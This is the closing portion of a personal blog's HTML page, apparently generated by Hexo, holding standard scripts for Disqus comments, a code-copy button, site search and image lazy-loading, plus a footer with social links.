e=document,n=e.createElement("script");n.src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js",l=e.createElement("link"),l.href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css",l.setAttribute("rel","stylesheet"),(e.head||e.body).appendChild(n),e.head.appendChild(l),n.onload=function(){new DisqusJS({shortname:"zeddyu",siteName:"blog.zeddyu.info",identifier:document.location.origin+document.location.pathname+document.location.search,url:document.location.origin+document.location.pathname+document.location.search,title:document.title,api:"https://blog.zeddyu.info/api/",apikey:"57m1j10pU1WfesAhs8Ri3OcmPEaRmoyIuNCPcYaUu6mqWu6Ek4qvRiQf9CXl2JoH",admin:"ZeddYu",adminLabel:""})}}var runningOnBrowser="undefined"!=typeof window,isBot=runningOnBrowser&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);setTimeout(function(){isBot||loadDisqus()},1)</script><div id="disqus_thread"></div></div></div></section><footer class="footer"><div class="container"><div class="columns content"><div class="column is-narrow has-text-centered"> &copy; 2021 Zedd&nbsp; Powered by <a href="http://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a></div><div class="column is-hidden-mobile"></div><div class="column is-narrow"><div class="columns is-mobile is-multiline is-centered"> <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener">GitHub</a> <a class="column is-narrow has-text-black" title="RSS" href="https://blog.zeddyu.info/atom.xml">RSS</a> <a class="column is-narrow has-text-black" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener">Twitter</a></div></div></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script><script>moment.locale("en-AU")</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script><style>.hljs{position:relative}.hljs .clipboard-btn{float:right;color:#9a9a9a;background:0 0;border:none;cursor:pointer}.hljs .clipboard-btn:hover{color:#8a8a8a}.hljs>.clipboard-btn{display:none;position:absolute;right:4px;top:4px}.hljs:hover>.clipboard-btn{display:inline}.hljs>figcaption>.clipboard-btn{margin-right:4px}</style><script>$(document).ready(function(){$("figure.hljs").each(function(t,e){var a="code-"+t,r=e.querySelector(".code"),c=$('<button>Copy <i class="far fa-clipboard"></i></button>');r.id=a,c.addClass("clipboard-btn"),c.attr("data-clipboard-target-id",a);var n=e.querySelector("figcaption");n?n.append(c[0]):e.prepend(c[0])}),new ClipboardJS(".clipboard-btn",{target:function(t){return document.getElementById(t.getAttribute("data-clipboard-target-id"))}}).on("success",function(t){t.clearSelection()})})</script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/script.js"></script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/insight.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1740444562387978" crossorigin="anonymous"></script><div class="searchbox ins-search"><div class="searchbox-mask"></div><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"> <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)"},CONTENT_URL:"/content.json"}</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html>